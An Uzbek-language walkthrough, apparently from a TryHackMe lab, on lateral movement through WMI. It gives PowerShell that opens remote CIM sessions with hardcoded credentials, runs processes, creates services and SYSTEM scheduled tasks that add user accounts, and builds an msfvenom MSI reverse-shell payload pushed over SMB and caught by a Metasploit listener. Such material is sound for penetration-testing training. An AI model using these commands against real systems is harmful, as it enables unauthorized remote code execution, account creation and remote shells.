
## 🔍 WMI nima?

**WMI (Windows Management Instrumentation)** — bu Windows operatsion tizimi tomonidan qo'llab-quvvatlanadigan texnologiya bo‘lib, u orqali masofaviy kompyuterlarni boshqarish mumkin. Administratorlar tizim holatini nazorat qiladi, xizmatlarni yaratadi, fayllarni ishga tushiradi... va **xuddi shu narsalarni hujumchilar ham suiste’mol qilishlari mumkin** — aynan lateral movement (tarmoqda oldinga yurish) maqsadida.

---

## 📌 PowerShell orqali WMI sessiyasi ochish

1. **Avval credential (login ma'lumotlari) yaratiladi:**

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

2. **So'ng WMI sessiya yaratiladi:**

```powershell
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

🔹 `TARGET` — bu siz kirishni xohlagan kompyuter nomi (masalan, `thmiis.za.tryhackme.com`)

---

## 🧨 Uzoqdan Process (dastur) ishga tushirish

Quyidagi buyruq orqali siz masofaviy tizimda PowerShell yordamida fayl yaratishingiz mumkin:

```powershell
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
    CommandLine = $Command
}
```

🧠 Bu buyruq siz ko'rmaydigan tarzda fon rejimida bajariladi.

---

## 🔧 WMI orqali xizmat (service) yaratish

Yangi xizmat yaratish (misol uchun foydalanuvchi qo‘shish uchun):

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
    Name = "THMService2";
    DisplayName = "THMService2";
    PathName = "net user munra2 Pass123 /add"; # Payload
    ServiceType = [byte]::Parse("16"); # Yangi jarayon sifatida ishlaydi
    StartMode = "Manual"
}
```

Keyin xizmatni ishga tushiring, to‘xtating va o‘chiring:

```powershell
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"
Invoke-CimMethod -InputObject $Service -MethodName StartService
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

---

## ⏰ Rejalashtirilgan vazifalar (Scheduled Tasks) yaratish

```powershell
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

Keyin uni o‘chirish:

```powershell
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

---

## 📦 MSI faylni o‘rnatish orqali hujum

1. **Payload (zararli fayl) yaratish:**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi
```

2. **Targetga nusxa ko‘chirish (SMB orqali):**

```bash
smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
```

> Fayl `C:\Windows\myinstaller.msi` ga joylashtiriladi.

3. **Metasploitda listener ishga tushirish:**

```bash
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST lateralmovement
set LPORT 4445
exploit
```

4. **Endi PowerShell orqali bu MSI faylni masofadan o‘rnatish:**

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{
    PackageLocation = "C:\Windows\myinstaller.msi"; 
    Options = ""; 
    AllUsers = $false
}
```

✅ Agar to‘g‘ri bajarilgan bo‘lsa, sizga **reverse shell** ochiladi va nishon (target) mashinadan ulanish keladi.

---

## 🔚 Xulosa

Yuqoridagilarning barchasi — **WMI orqali masofaviy tizimda ishlov berish, foydalanuvchi qo‘shish, xizmat yoki dastur ishga tushurish,** va **zararli fayl o‘rnatish** bo‘yicha real hujum amaliyoti.

🛡 Bu bilimlar **Red Teaming, Penetration Testing,** va **lateral movement** asoslarini tushunish uchun juda muhim.

Agar xohlasangiz, men sizga ushbu har bir bo‘lim uchun amaliy topshiriq ham tuzib bera olaman. Yordam kerak bo‘lsa, so‘rashingiz kifoya.
